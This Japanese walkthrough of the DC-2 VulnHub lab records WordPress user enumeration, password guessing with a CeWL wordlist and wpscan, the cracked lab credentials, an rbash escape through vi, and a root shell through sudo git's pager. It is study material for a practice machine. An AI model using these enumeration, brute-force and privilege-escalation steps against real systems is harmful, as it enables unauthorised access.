## DC-2 454~
## 目的
- flag1 webサイト
- flag2 wordpress login
- flag3 ターゲットフォルダ
- flag4 ターゲットフォルダ
- finalflag rootフォルダ
- 合計5つのフラグを表示する

### ポートスキャンまでは同じ
- ポートスキャン
  - 80(http)
  - 7744(ssh) オプションに`-sV`とかつけないと謎のサービスを出してくることがある

### WEBサイトを見る
- `192.168.56.104`でサイトを見ると`dc-2`に飛ばされる(リダイレクトと呼ぶ)
- 直すために`sudo vim /etc/hosts`に以下のように書き込む
- `192.168.56.104 dc-2`
- これはipアドレスにドメインネームを設定している
- サイトが開くのでflag1を見つける
- サイトを見てFLAGSを探す。3つヒントが書いてある。
- 1. Cewlを使う
  2. 1人でログイン
  3. 別名でログイン



### gobuster
- `gobuster dir -b 403,404 -u $URL -w /usr/share/wordlists/dirb/common.txt -x php -t 50`
  - `$URL`の代わりに`$IP`でもOK
  - `-b` statusの403,404は表示しない 
  - `-x` 拡張子がphpも探す
  - `-t` スレッド数を50に増やす。デフォルトは10
- `/wp-admin`があることがわかる

### ブラウザでチェックしてみる
- 先ほど取得した`/wp-admin`ディレクトリでサイトにアクセスしてみるとwordPressのダッシュボードの認証ページに飛ぶことがわかる。HTMLのコードを見ると、`/wp-login.php`にpostしているのがわかる
- wordpressが使われているので、できるだけ専用のwpscanコマンドを使った方が効率的である
- それ以上は特にわからない

### Nmap NSE
- nmap nseはnmapのスキャンを利用して、同時にスクリプトを実行できる。ここではwordPressのユーザを見つけるスクリプトを使う。
- nmapスクリプトで使えるのを探す。次ので検索すると出てくる
  - `cat /usr/share/nmap/scripts/script.db | grep wordpress | grep user`
  - 何が検索できる?filenameの部分がスクリプトのコード
- `nmap -p80 --script http-wordpress-users dc-2`
  - `--script`でスクリプトを指定できる。`http-wordpress-users.nse`でもいい
  - `-p80`はなくてもいい 
- userが3人であることがわかる
- users.txtを作る
  - `cat > users.txt` で３人の名前を書いて、改行して ctrl + c
  - ```
    admin
    jerry
    tom 
    ```
- http-wordpress-usersのスクリプト(プログラム)は`/usr/share/nmap/scripts`
- (補足)wpscanでもできる
  - `wpscan --url dc-2 -eu`
  - $URLは使えない。ドメインネームでないとダメだからアドレスは使えない
  - `-eu`は`-enumerate u`の略



### CewL
- CewLは指定したWEBサイトをスクレイピングして、キーワードを辞書ファイルとして生成するツール
- `cewl dc-2 -w cewl.txt`
  - パスが通っていないのでCewlフォルダに入って実行する
  - dc-2は/etc/hostsで設定したIPアドレスで、そこの対象のサイトをスクレイピングする
  - -wはファイルの書き込みを指定していて、ここでは一つ上のフォルダに指定している。
  - 絶対パスで作ったフォルダに入れてもいい。実はこっちの方がいい `-w ~/vulnhub/dc2/cewl.txt`

### wpscan
- `wpscan --url http://dc-2  -U users.txt -P cewl.txt`
- または、こっちだとユーザネームもやってくるれる
- `wpscan --url http://dc-2 --passwords cewl.txt`
  - --passwordsのオプションのhelp見る。そこにもし、オプションに--usernameがなければ、ユーザネームの列挙も一緒にすると書いてある


### 認証情報
- 結果２人の情報がわかる

|ユーザ名|パスワード|
|:-|:-|
|admin|?|
|jerry|adipiscing|
|tom|parturient|

### WordPressのダッシュボードにアクセスする
- `http://dc-2/wp-admin/`
- 二人のどちらかでNmapとHydraで得たuser,passwordを入力してアクセスする
- Flag2を見つける 

### jerryでssh
- jerryでログインするが失敗する。jerryはwordpressのパスワードとsshのパスワードを使い回していない

### tomでSSH
- wordPressの投稿者がsshのユーザと仮定している
- tomでssh `ssh -p 7744 tom@$IP`
- passwordを入力

### 実行できるコマンドを調べる
- `echo $PATH`を見ると、PATHが一つしかない、ここにあるコマンドが使える
- `ls $PATH`を見るとコマンドが４つしか使えない
- プロンプトが返ってくる `echo $SHELL`でrbashという制限が多いシェルだとわかる 

### 通常のシェルを使えるようにする
- viは使えるのでGTFOBinsで`vi`でシェルを呼び出すのを見つける
- viを呼び出す
- viのsetコマンドの説明
  - setコマンドはviの設定をすることができる
  - 例えば`:set number`とすると行数を表示できる。そして頭に`:set no~`noをつけると解除できる
  - 今使っている設定を知るには`:set オプション?`とする 
- 今使っているshellを調べる`:set shell?`
- `:set shell=/bin/sh`
  - shellをshに変更する
- Enterを押す 
- `:shell`
  - shellに戻る指示 
- Enterを押して指示を決定
- `$`が出たら成功、これで通常のシェルが使えるようになる

### シェルを確認する
- `echo $SHELL`
  - userのシェルの設定がわかる 
- `echo $0`
  - 実際に起動しているシェルがわかる
- 制限のあるrbashから通常のshのシェルになっている。ただし、`su`コマンドは使えないのでjerryにはユーザを変えれない

### 環境変数を設定する
- 通常のコマンドが使えるようにPATHを追加する。ここではターゲットのサーバのPATHに何のコマンドがあるので、思いつく限りの全てのコマンドのPATHを設定する
- `export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin/:/usr/bin:/sbin:/bin`
- 確認する `echo $PATH`
- (補足)ちなみに、suコマンドは/binにあるので、これだけでもいい。
- (補足の補足)ここではjerryのパスワードがわかっているので、suコマンドだけが使えたらいいので、ParrotOSのターミナルでsuコマンドのPATHさえわかればいいのでPATHを調べる。`which -a su`調べて`/usr/bin/su jerry`または`/bin/su jerry`でもいいが、これはParrotのPATHの場所なのでターゲットのOSとは異なる可能性がある。実際に`/usr/bin/`にはsuコマンドはないので、結果として/binだけでいい

### ユーザでsshする
- 複数の候補があった時に一番ルートが取れそうな権限の強いユーザの利用を目指す

### jerryでssh
- ユーザを切り替え `su jerry`
- suとsshのパスワードは違う。まえのパスワードはsuのパスワードだったようだ

### sudoコマンドの設定を調べる
- `sudo -l`
- 次の表示がされるが、これはgitをrootなしで使えることがわかる
  - `(root) NOPASSWORD: /usr/bin/git`
### git
- GTFOBinsでgitコマンドを利用して、root権限を取得する
- `sudo git -p help config`
- `:`と出てきたら成功で以下を入力
- `!/bin/sh`
- (補足) `git -p help config`でshでrootになれる理由
  - このコマンドでgitのhelpをページングで見ることができる。ページングとはlessみたいに一覧表示でなく順に見れて、一番下に`:`が出てくる状態。
  - このページングの状態では実はコマンドを打つことができる。`:`この状態で頭に`!`を打つ、例えば`!ls`とするとlsコマンドが使える。だから`!/bin/sh`とするとrootでシェルが使える
  - この理屈はページングが使えるコマンドでは使えるはずなので、`less`,`tail`でも使える。GTFOBinsを見てみる。

### Flagを取得
  - `cd /root | cat final-flag.txt` 

## (参考)root取得後
- dc2のスナップショットをとる
- rootのpasswordを変更する
  - `passwd`
  - パスワードはdragonにする。変更したらvirtualBoxの設定に説明欄があるので忘れないようにパスワード書いておく
  - `root:dragon` 
- rootでsshできるようにする
  - 本来は危険なのでrootでsshすることはできなが、ここではこれからrootでdc2をいじっていくのでsshできるようにする
  - `nano /etc/ssh/sshd_config`
  - この3つを変更する`PermitRootLogin yes`,`# AllowUsers tom`,`PasswordAuthentications yes`
  - nanoの保存は、まず`ctrl+o`,Enter,`ctrl+x`
  - 書き換えたファイルをreloadする`systemctl reload sshd`
  - rootでsshに接続してみる
- ParrotからのsshをIPアドレスを利用して拒否する。その1
  - `nano /etc/hosts.deny`
  - `sshd:ParrotのIPアドレス`
  - 新しいターミナルを開けて、dc2にsshしてみる
- portの7744の設定
  - /etc/ssh/sshd_config
  - Port 7744
- dc-2のドメインネームの設定
  - wordpress特有のもの、本来はサーバであるapacheで設定する
  - /var/www/html/wp-config.php
  - `define('WP_HOME','http://dc-2');`
- wordpressのadminのパスワードを探す
  - `mysql -h localhost -u ユーザ名 -pパスワード`
  - `show databases;`以下同文  
- このサーバを作った経緯はどこでわかる
  - cat /var/log/auth.log 
- root,tom,jerryの過去のbashのコマンド見る


## rbashの作成の仕方(geminiより)
```
制限付き環境の構築
rbashは、ユーザーのホームディレクトリにある$PATH変数を参照します。安全な環境を構築するには、そのユーザーが実行できるコマンドをホワイトリスト方式で指定する必要があります。

ユーザーのホームディレクトリに、実行可能なコマンドのシンボリックリンクを格納するディレクトリ（例: ~/bin）を作成します。

Bash

mkdir /home/<ユーザー名>/bin
そのユーザーに許可したいコマンドへのシンボリックリンクを、この~/binディレクトリに作成します。

Bash

ln -s /usr/bin/ls /home/<ユーザー名>/bin/ls
ln -s /usr/bin/cat /home/<ユーザー名>/bin/cat
ユーザーの.bash_profileまたは.bashrcファイルで$PATHを~/binに限定します。

ユーザーの.bash_profileまたは.bashrcファイルで$PATHを~/binに限定します。

Bash

echo 'PATH=$HOME/bin' >> /home/<ユーザー名>/.bash_profile
ユーザーがこれらの設定ファイル（例: .bash_profile）を編集できないように、所有者と権限を変更します。

Bash

sudo chown root:root /home/<ユーザー名>/.bash_profile
sudo chmod 444 /home/<ユーザー名>/.bash_profile

```
